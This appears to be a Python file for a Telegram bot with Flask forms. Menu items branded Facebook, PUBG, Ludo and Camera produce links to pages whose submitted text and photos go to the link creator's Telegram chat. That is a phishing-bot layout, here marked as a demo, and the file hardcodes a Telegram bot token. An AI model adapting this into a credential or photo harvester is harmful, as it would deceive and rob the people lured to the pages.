import threading
from flask import Flask, request, render_template_string
from telegram import Update, ReplyKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, ContextTypes, filters

# ================= CONFIG =================
BOT_TOKEN = "7975528068:AAGMdgLfamn7Pt2W9WJXdrmtbhiAyTAqVf4"
WEB_PORT = 8081
DISCLAIMER = "⚠️ دا یوازې DEMO دی. ریښتینی اکاونټ، پاسورډ یا شخصي معلومات مه داخلوئ."
# ==========================================

app = Flask(__name__)

HTML_FORM = """
<!doctype html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Demo Page</title>
</head>
<body>
<h3>{{ title }}</h3>
<p style="color:red;">{{ disclaimer }}</p>

<form method="POST" enctype="multipart/form-data">
  {% if show_text %}
    <label>Demo Text:</label><br>
    <input name="demo_text" required><br><br>
  {% endif %}

  {% if show_file %}
    <label>Upload Demo Photo (اختیاري):</label><br>
    <input type="file" name="photo" accept="image/*"><br><br>
  {% endif %}

  <button type="submit">Submit</button>
</form>
</body>
</html>
"""

@app.route("/demo/<item>/<int:uid>", methods=["GET", "POST"])
def demo(item, uid):
    if request.method == "POST":
        text = request.form.get("demo_text", "")
        photo = request.files.get("photo")

        msg = f"📥 DEMO DATA\nItem: {item}\nText: {text}\nUserID: {uid}"
        bot_app.bot.send_message(chat_id=uid, text=msg)

        if photo:
            bot_app.bot.send_photo(chat_id=uid, photo=photo.stream)

        return "✅ Demo data sent to your Telegram bot."

    return render_template_string(
        HTML_FORM,
        title=f"{item.upper()} DEMO",
        disclaimer=DISCLAIMER,
        show_text=True,
        show_file=(item == "camera")
    )

def run_flask():
    app.run(host="0.0.0.0", port=WEB_PORT)

# ================= TELEGRAM BOT =================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [["Facebook", "PUBG"], ["Ludo", "Camera"]]
    await update.message.reply_text(
        "👋 Demo Bot Ready\n" + DISCLAIMER,
        reply_markup=ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    )

async def menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    item = update.message.text.lower()
    uid = update.message.from_user.id
    link = f"http://127.0.0.1:{WEB_PORT}/demo/{item}/{uid}"

    await update.message.reply_text(
        f"🔗 {item.upper()} Demo Link:\n{link}\n\n{DISCLAIMER}"
    )

bot_app = ApplicationBuilder().token(BOT_TOKEN).build()
bot_app.add_handler(CommandHandler("start", start))
bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu))

# ================= MAIN =================
if __name__ == "__main__":
    threading.Thread(target=run_flask, daemon=True).start()
    bot_app.run_polling()
